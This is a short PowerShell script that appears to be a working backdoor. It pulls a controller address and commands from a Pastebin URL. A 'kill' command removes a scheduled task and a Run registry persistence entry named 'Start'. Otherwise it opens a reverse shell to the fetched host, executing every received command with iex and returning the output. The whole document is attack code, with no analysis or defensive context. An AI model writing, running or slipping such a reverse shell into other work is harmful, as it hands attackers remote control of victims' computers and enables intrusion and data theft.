$re = (IWR "https://pastebin.com/raw/8GebHvJ9")

if ($re.Content -match 'hold') {
    Exit
}

if ($re.Content -match 'kill') {
    schtasks /Delete /TN "Start" /f
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
    Exit
}

$c=New-Object System.Net.Sockets.TCPClient($re)

$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbB=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbB,0,$sbB.Length);$s.Flush()};$c.Close()
